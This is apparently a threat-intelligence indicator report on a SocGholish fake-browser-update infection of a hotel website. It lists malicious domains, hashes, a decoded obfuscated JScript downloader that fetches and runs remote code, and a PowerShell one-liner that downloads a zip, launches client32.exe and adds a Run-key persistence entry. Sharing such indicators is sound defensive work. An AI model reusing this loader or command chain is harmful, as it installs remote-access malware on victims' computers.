TLP: Amber - No Attribution
THREAT IDENTIFICATION: SOCGHOLISH (likely SmartApeSG)

INFECTED DOMAIN
grandhotelcapemay.com

INJECTED JAVASCRIPT URL
https://www.grandhotelcapemay.com/

STAGE 1 INJECTED JAVASCRIPT
<script type='text/javascript' src="https://legderlivesapp.online/cdn-vs/original.js"></script>

STAGE 2 FAKE UPDATE PAGE ASSET URLS
https://legderlivesapp.online/cdn-vs/assets/css/index.css
https://legderlivesapp.online/cdn-vs/assets/img/chrome.png
https://legderlivesapp.online/cdn-vs/assets/img/hero-img_desktop%201.png
https://legderlivesapp.online/cdn-vs/assets/js/index.js

JAVASCRIPT FILE DOWNLOAD URL
https://legderlivesapp.online/cdn-vs/main.php?

JS FILE HASH
Update.js
76a406118362779f6d43a60ac4fd61f6
SHA1: 5eb3167457b49734f8ea4b1a036828c70e386fb6
SHA256: 66af4d40fa6e5daaaeeb027a88bb38ab560b2de1c81d7613c35139dda1639446

EXTRACTED AND DECODED JAVASCRIPT
function a() {
var _0x5e9c46 = [
'84pnBoyZ',
'6452370OgKBgk',
'1878363WBgHOA',
'1fTXFUA',
'POST',
'send',
'https://legderlivesapp.online/cdn-vs/download.php?10702',
'206562KgIdaJ',
'responseText',
'2351410yKcwea',
'MSXML2.ServerXMLHTTP.6.0',
'return WScript.CreateObject(qqq)',
'open',
'10JllAch',
'1106710DpIzpp',
'9qsFRKM',
'373032aJhcXf',
'8UZldiN',
'18697572zhBxkj',
]
a = function () {
return _0x5e9c46
}
return a()
}
function b(_0x1d0007, _0x6418b3) {
var _0x5b588c = a()
b = function (_0x2cfff3, _0xc208e3) {
_0x2cfff3 = _0x2cfff3 - 489
var _0x142f9a = _0x5b588c[_0x2cfff3]
return _0x142f9a
}
return b(_0x1d0007, _0x6418b3)
}
var j = b
;(function (_0x11df76, _0x2c10a5) {
var _0x5e1e99 = b,
_0x598347 = _0x11df76()
while (true) {
try {
var _0x4705ab =
(-parseInt(_0x5e1e99(495)) / 1) * (-parseInt(_0x5e1e99(501)) / 2) +
(parseInt(_0x5e1e99(494)) / 3) * (-parseInt(_0x5e1e99(490)) / 4) +
-parseInt(_0x5e1e99(493)) / 5 +
(-parseInt(_0x5e1e99(499)) / 6) * (-parseInt(_0x5e1e99(492)) / 7) +
(parseInt(_0x5e1e99(489)) / 8) * (-parseInt(_0x5e1e99(507)) / 9) +
(parseInt(_0x5e1e99(505)) / 10) * (parseInt(_0x5e1e99(506)) / 11) +
parseInt(_0x5e1e99(491)) / 12
if (_0x4705ab === _0x2c10a5) {
break
} else {
_0x598347.push(_0x598347.shift())
}
} catch (_0x181877) {
_0x598347.push(_0x598347.shift())
}
}
})(a, 658225)
function xcvsdf(_0xe92028) {
var _0x376a0c = b
aa = Function('qqq', _0x376a0c(503))
var _0x116e67 = aa(_0x376a0c(502))
return (
_0x116e67[_0x376a0c(504)](_0x376a0c(496), _0xe92028, false),
_0x116e67[_0x376a0c(497)](),
_0x116e67[_0x376a0c(500)]
)
}
fghfgh(xcvsdf(j(498)))
function fghfgh(_0x25e4c5) {
Function(_0x25e4c5)()
}

NEXT STAGE FILTERING URL
https://legderlivesapp.online/cdn-vs/download.php?10702

INTERCEPTED POWERSHELL 
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Ex Bypass -NoP -C $ZQQPJ='https://ygbqtr.icu/data.php?12275';$LHGMNJHLG=(New-Object System.Net.WebClient).DownloadString($ZQQPJ);$NTNRFKK=[System.Convert]::FromBase64String($LHGMNJHLG);$asd = Get-Random -Minimum -10 -Maximum 17; $WNHWJI=[System.Environment]::GetFolderPath('ApplicationData')+'\IAJL'+$asd;if (!(Test-Path $WNHWJI -PathType Container)) { New-Item -Path $WNHWJI -ItemType Directory };$p=Join-Path $WNHWJI 'CCleaner.zip';[System.IO.File]::WriteAllBytes($p,$NTNRFKK);try {    Add-Type -A System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory($p,$WNHWJI)} catch {    Write-Host 'Failed: ' + $_;    exit};$CV=Join-Path $WNHWJI 'client32.exe';if (Test-Path $CV -PathType Leaf) { Start-Process -FilePath $CV} else {Write-Host 'No exe.'};$fd=Get-Item $WNHWJI -Force; $fd.attributes='Hidden';$s=$WNHWJI+'\client32.exe';$k='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run';$v='KLGACJE';$DS='String';New-ItemProperty -Path $k -Name $v -Value $s -PropertyType $DS;

PAYLOAD DOWNLOAD URL
https://ygbqtr.icu/data.php?12275

PAYLOAD FILE HASH
I did not get a payload

PAYLOAD C2
I did not get a payload

